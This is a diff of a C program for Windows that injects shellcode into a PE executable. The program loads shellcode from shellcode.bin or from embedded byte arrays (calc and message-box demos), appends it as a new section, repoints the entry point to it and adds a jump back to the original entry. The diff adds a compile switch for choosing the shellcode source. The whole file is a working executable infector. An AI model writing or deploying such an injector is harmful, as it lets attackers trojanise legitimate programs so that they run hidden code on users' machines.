@@ -1,8 +1,8 @@
 #include <Windows.h>
 #define SHELLCODE_FILENAME L"shellcode.bin"
 #define OUTPUT_FILENAME L"__injected.exe"
+#define USE_BIN_FILE 
 /*
-*/
 #include <stdio.h>
 #include <tchar.h>
 int PrintNumber(__in int nNumber)
@@ -19,8 +19,8 @@ void print_128_bit_chunk( unsigned char* chunk ) {
             chunk[8] << 24 | chunk[9] << 16 | chunk[10] << 8 | chunk[11] ,
             chunk[12] << 24 | chunk[13] << 16 | chunk[14] << 8 | chunk[15] ) ;
 }
+*/
 unsigned char shellcode_ori[] = 
-/*
 // calc x86 & x64
 "\x50\x54\x58\x66\x83\xe4\xf0\x50\x31\xc0\x40\x92\x74\x50\x60" 
 "\x4a\x52\x68\x63\x61\x6c\x63\x54\x59\x52\x51\x64\x8b\x72\x30" 
@@ -36,6 +36,7 @@ unsigned char shellcode_ori[] =
 "\x45\x75\xef\x8b\x74\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01" 
 "\xf7\x99\xff\xd7\x48\x83\xc4\x68\x5d\x5f\x5e\x5b\x59\x5a\x5c" 
 "\x58"
+/*
 // msgbox block x86
 "\x55\x8b\xec\x83\xec\x0c\x53\x8d\x45\xf4\x33\xdb\x50\xb9\x4c" 
 "\x77\x26\x07\xc7\x45\xf4\x75\x73\x65\x72\xc7\x45\xf8\x33\x32" 
@@ -57,7 +58,6 @@ unsigned char shellcode_ori[] =
 "\x83\xc4\x10\xc3\x8b\x74\x24\x10\x8b\x44\x16\x24\x8d\x04\x58" 
 "\x0f\xb7\x0c\x10\x8b\x44\x16\x1c\x8d\x04\x88\x8b\x04\x10\x03" 
 "\xc2\xeb\xdb\x90"
-*/
 // msg block x64
 "\xe9\x5b\x01\x00\x00\xcc\xcc\xcc\x48\x89\x5c\x24\x08\x48\x89" 
 "\x74\x24\x10\x57\x48\x83\xec\x10\x65\x48\x8b\x04\x25\x60\x00" 
@@ -85,6 +85,7 @@ unsigned char shellcode_ori[] =
 "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\x56\x48\x8b\xf4\x48\x83\xe4\xf0" 
 "\x48\x83\xec\x20\xe8\x93\xff\xff\xff\x48\x8b\xe6\x5e\xc3\xcc" 
 "\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xeb\x00"
+*/
 ;
 int wmain(int argc, wchar_t* argv[]) {
 	HANDLE hFile_bin		=	CreateFile( SHELLCODE_FILENAME , GENERIC_READ , FILE_SHARE_READ , NULL , OPEN_EXISTING , 0 , NULL ) ;
@@ -149,22 +150,26 @@ int wmain(int argc, wchar_t* argv[]) {
 				last_section_header			=	( IMAGE_SECTION_HEADER* )( ( BYTE* )p_section_header + ( number_of_section - 1 ) * sizeof( IMAGE_SECTION_HEADER ) ) ;
 				file_alignment				=	p_nt_header->OptionalHeader.FileAlignment ; 
 				section_alignment			=	p_nt_header->OptionalHeader.SectionAlignment ; 	
+#ifdef USE_BIN_FILE
 				sizeof_shellcode			=	binFileSize + sizeof( DWORD ) + 1 ;
-				//sizeof_shellcode			=	sizeof( shellcode_ori ) + sizeof( DWORD ) ;
+#else
+				sizeof_shellcode			=	sizeof( shellcode_ori ) + sizeof( DWORD ) ;
+#endif
 				shellcode					=	( unsigned char* )LocalAlloc( LMEM_FIXED , sizeof_shellcode ) ;			
 				SizeOfRawData_added			=	( ( sizeof_shellcode / file_alignment ) + 1 ) * file_alignment ;
 				VirtualSize_added			=	( ( sizeof_shellcode / section_alignment ) + 1 ) * section_alignment ;
 				OEP							=	p_nt_header->OptionalHeader.AddressOfEntryPoint ;
 				jmp_to						=   OEP - ( last_section_header->VirtualAddress + last_section_header->SizeOfRawData +  sizeof_shellcode ) ;
 				// jmp 回去
+#ifdef USE_BIN_FILE
 				CopyMemory( shellcode , binContent , binFileSize ) ; 
 				CopyMemory( shellcode + binFileSize , "\xe9" , 1 ) ;
 				*( DWORD* )( shellcode + binFileSize + 1 ) = jmp_to ;
-				/*
+#else
 				CopyMemory( shellcode , shellcode_ori , sizeof( shellcode_ori ) - 1 ) ; // 去掉结尾的 '\0'
 				CopyMemory( shellcode + sizeof( shellcode_ori ) - 1 , "\xe9" , 1 ) ;
 				*( DWORD* )( shellcode + sizeof( shellcode_ori ) ) = jmp_to ;
-				*/
+#endif
 				// 改入口
 				p_nt_header->OptionalHeader.AddressOfEntryPoint = last_section_header->VirtualAddress + last_section_header->SizeOfRawData ;
 				// 改size
